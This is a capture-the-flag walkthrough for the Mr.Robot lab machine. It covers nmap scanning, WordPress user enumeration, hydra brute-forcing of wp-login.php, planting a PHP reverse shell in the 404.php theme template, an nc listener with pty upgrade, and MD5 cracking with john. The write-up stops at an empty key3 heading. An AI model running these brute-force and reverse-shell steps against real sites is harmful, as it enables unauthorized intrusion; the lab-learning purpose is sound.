Mr.Robot CTF
===

### environment
KALI Linux ip 10.10.228.21

TARGET 10.10.106.11
###   Hack the machine

- [x] key1
First,use nmap to confirm which port is open

```
nmap -sV -sC 10.10.106.11
```

We know that port 80 443 is open, we can check port 80 and 443 .

http://10.10.106.11,we got like hacker command line interface,but that just say why Mr.Robo hacker billionaire.

![image](https://user-images.githubusercontent.com/67756786/193573386-bd27b73e-8e9c-4a41-bf71-262b67a0d4ac.png)

I think that can use nmap to scan http

```
nmap -p80 --script http-enum 10.10.106.11
```
![image](https://user-images.githubusercontent.com/67756786/193574089-ea48f301-ba26-4d90-8287-97e9561c9ad3.png)

We got some page information,first,I visit robots.txt.

I got one dictionary and key1

![image](https://user-images.githubusercontent.com/67756786/193574635-83e789b6-4bca-492a-9951-6fe1d4451809.png)

- [x] key2

I sort dictionary and purge same word.

```
sort fsocity.dic | uniq > fsocity.dic.uni
```

Originally there have 800000 more word, but remain 10000 more word after sort.

![image](https://user-images.githubusercontent.com/67756786/193575699-9e38693f-ea5c-4c2d-893e-6270e4d6541d.png)
![image](https://user-images.githubusercontent.com/67756786/193575822-6868847e-e833-4678-89be-9952ae8af6ff.png)

check wordpress version,press F12 and search ver,we know wordpress version is 4.3.1

![image](https://user-images.githubusercontent.com/67756786/193729112-0f6e00f9-82c0-4d86-b939-bbefd77e3dd6.png)

wordpress has user enumeration exploit,if wrong user will print invaild username.

![image](https://user-images.githubusercontent.com/67756786/193732070-2e9655b1-dc9c-46a2-bb0a-f3f4080f97b3.png)

Now we can use burp suite to intercept WP login request.


![image](https://user-images.githubusercontent.com/67756786/193734649-924974cd-c922-495d-8aef-b8ec9ef0b0ac.png)



We can use hydra to brute force username,and we got username Elliot.

```
hydra -L fsocity.dic.uniq -p password 10.10.168.7 http-post-form -t 30 '/wp-login.php:log=^USER^&pwd=^password^&wp-submit=Log+In:Invalid username'
```

![image](https://user-images.githubusercontent.com/67756786/193734975-7d2cef62-364d-469e-ab78-7aacfae83126.png)

Next try password,use same dictionary to crack password.

```
hydra -l Elliot -P fsocity.dic.uniq 10.10.168.7 http-post-form -t 30 '/wp-login.php:log=^USER^&pwd=^password^&wp-submit=Log+In:The password you entered'
```
IF I hadn't sort the dictionary , that could been wait for a long time.

Now got pw is ER28-0652

I upload php reverse shell to 404.php(appearance->editor->404.php)
php reverse shell source code.
(https://github.com/pentestmonkey/php-reverse-shell)

![image](https://user-images.githubusercontent.com/67756786/193764939-d7e21dc5-24e6-4d0b-b819-6b647658cb33.png)

kali listen to 1234,and url paste 10.10.195.36/404.php.

```
nc -lvnp 1234
```

Now got reverse shell,and use pty 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
press Ctrl + z
stty raw -echo; fg
press twice Enter
```
![image](https://user-images.githubusercontent.com/67756786/193771566-23cc7cab-0073-464e-8b33-e8db6df45c27.png)

cd to /home ,and use ls to confirm user

```
cd /home
ls
```

![image](https://user-images.githubusercontent.com/67756786/193771931-613113da-5cf5-4b1c-afad-3b6e7d12fc8a.png)

into robot ,after we got key2 but Permission denied.

![image](https://user-images.githubusercontent.com/67756786/193772149-c3944d0c-2515-4839-8ee5-feda2d983899.png)

Now confirm password.raw-md5

![image](https://user-images.githubusercontent.com/67756786/193772294-2723582e-4844-4ad6-a5ad-dd8119204a48.png)

We can use john to crack that,dictionary use rockyou.txt

robot's hash password save to hash.txt for john.

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt   hash.txt
```

![image](https://user-images.githubusercontent.com/67756786/193775597-1769c5b9-ca88-4750-9467-cb523654e582.png)

Now, login by robot,and confirm key2

![image](https://user-images.githubusercontent.com/67756786/193776151-851a1845-6b42-4ae0-8c97-66d2f2623de3.png)

. [x] key3


